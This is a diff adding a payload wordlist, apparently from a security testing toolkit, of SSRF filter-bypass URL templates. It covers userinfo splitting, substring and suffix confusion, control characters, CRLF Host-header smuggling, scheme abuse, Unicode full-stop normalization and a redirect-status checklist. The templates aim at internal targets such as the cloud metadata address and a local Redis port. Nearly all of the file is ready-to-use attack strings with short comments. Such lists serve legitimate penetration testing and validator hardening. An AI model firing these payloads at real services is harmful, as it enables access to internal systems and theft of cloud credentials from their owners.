@@ -1,0 +1,92 @@
+# ssrf-parser-confusion.txt — URL grammar attacks against split-decision validators
+#
+# Used by: ssrf-parser-confusion-rebind, webhook-ssrf-deblind, ssrf-fetch-by-url.
+#
+# Every entry exploits the same structural fact: the component that DECIDES whether a URL is
+# allowed and the component that DIALS it are different pieces of code, often different libraries
+# in different languages, and they disagree about where the host ends. The validator reads one
+# host; the client connects to another.
+#
+# ALLOWED = a hostname the target's filter accepts (its own domain, a partner domain, a CDN).
+# TARGET  = the internal address you actually want, e.g. 169.254.169.254 or 127.0.0.1:6379.
+# Substitute both before use.
+
+## ---- userinfo splitting ----
+# The validator reads everything before the last @ as the host; the client reads it as credentials.
+http://ALLOWED@TARGET/
+http://ALLOWED:80@TARGET/
+http://ALLOWED:pass@TARGET/
+http://ALLOWED%40TARGET/
+http://ALLOWED%2540TARGET/
+http://TARGET#@ALLOWED/
+http://ALLOWED@TARGET#.ALLOWED/
+
+## ---- fragment and query placement ----
+# For validators that ask "does this URL contain ALLOWED anywhere?" rather than "is the HOST
+# equal to ALLOWED?". This substring-anywhere check is extremely common in image proxies.
+http://TARGET/?x=ALLOWED
+http://TARGET/#ALLOWED
+http://TARGET/ALLOWED
+http://TARGET/?next=https://ALLOWED/
+http://TARGET/redirect?to=ALLOWED
+
+## ---- suffix and prefix confusion ----
+# Defeats endsWith / startsWith / naive regex anchoring.
+http://ALLOWED.attacker-controlled.tld/
+http://attacker-controlled.tld/ALLOWED/
+http://ALLOWED-attacker-controlled.tld/
+http://notALLOWED/
+
+## ---- whitespace and control characters in or around the netloc ----
+# Parsers disagree on whether these terminate the host, belong to userinfo, or start the path.
+# Send both raw and percent-encoded; some stacks decode before parsing and some after.
+http://ALLOWED\@TARGET/
+http://ALLOWED%09@TARGET/
+http://ALLOWED%0d%0a@TARGET/
+http://ALLOWED%00@TARGET/
+http://ALLOWED\tTARGET/
+http://ALLOWED%5cTARGET/
+http://ALLOWED%252f%252f TARGET/
+
+## ---- CRLF header smuggling inside a URL component ----
+# Where the client pastes URL components into the wire format unchecked, a folded header wins over
+# the connected host. Look for stacks that build the request line by string concatenation.
+http://ALLOWED/%0d%0aHost:%20TARGET%0d%0a
+http://ALLOWED/%0d%0aX-Forwarded-For:%20TARGET%0d%0a
+http://ALLOWED:80%0d%0aHost:%20TARGET%0d%0a/
+
+## ---- scheme abuse ----
+# A very long scheme name makes some parsers give up and treat the URL as relative, resolving it
+# against the application's own base — which is useful when the filter is a prefix check.
+http:/\TARGET/
+http:\\TARGET/
+//TARGET/
+https:/TARGET/
+http:TARGET/
+httpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA://TARGET/
+
+## ---- IDNA / Unicode normalization differences ----
+# The validator does not apply IDNA; the HTTP client does (or vice versa). The classic case is a
+# character that expands to two ASCII letters under normalization, changing the registrable domain.
+# Build these against the specific ALLOWED value; the shapes below are the templates.
+http://ALLOWED。TARGET/
+http://ALLOWED．TARGET/
+http://ALLOWED｡TARGET/
+# ideographic and halfwidth full stops that normalize to "." in some resolvers
+
+## ---- case and encoding of the scheme separator ----
+HTTP://TARGET/
+hTtP://TARGET/
+http:%2f%2fTARGET/
+http:/%2fTARGET/
+
+## ---- redirect statuses to test individually ----
+# Not payloads — a checklist. Test EACH separately: a client documented as not following
+# redirects frequently still follows exactly one of these, and that exception is the finding.
+# 301 Moved Permanently      (downgrades POST to GET)
+# 302 Found                  (downgrades POST to GET in practice)
+# 303 See Other              (explicitly downgrades to GET; commonly allowed when others are not)
+# 307 Temporary Redirect     (preserves method AND body)
+# 308 Permanent Redirect     (preserves method AND body)
+# Also test: meta refresh, a Location header with no scheme, and a two-hop chain where only the
+# first hop is validated.
